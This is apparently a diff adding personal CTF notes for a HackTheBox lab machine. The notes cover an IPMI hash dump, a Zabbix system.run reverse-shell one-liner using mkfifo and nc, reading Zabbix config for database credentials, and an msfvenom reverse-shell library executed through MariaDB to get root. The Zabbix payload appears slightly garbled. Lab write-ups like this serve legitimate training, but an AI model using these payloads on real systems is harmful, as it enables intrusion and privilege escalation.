@@ -1,0 +1,28 @@
+Exploits:
+
+ipmi bypass cypher 0
+	
+	Using Metasploit ipmi/dumphash module to exctract the username & password hash
+
+Zabbix 5.0.x
+
+	Using a reverse shell exploit via hosts/items directory on the web server with the "system.run" statement
+		
+		"system.run[r10.10.14.141 1234 >/tmp/fm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc,nowait]" 
+
+Privilege Escalation
+
+	Using the ipmi user&password we get the user flag and discoverd that the system is using mariaDB
+		Using Netstat you will know which ports are runing on the server and thats how u know that mariaDB is in use
+	
+
+	Search for usefull files in the system and read /etc/zabbix/zabbix_server.conf
+		Here you will find the user & password for the DB
+
+	You have to create a http server on the attacker machine & Download in the /tmp directory victim machine the next exploit
+	
+		msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.141  LPORT=4422 -f elf-so -o /home/user/Documents/HTB/shibboleth/shell.so
+			before you execute the payload you need to have a nc in the attacker machine with the designated port
+
+	Execute the payload with mariaDB
+	Now u have Root privileges 
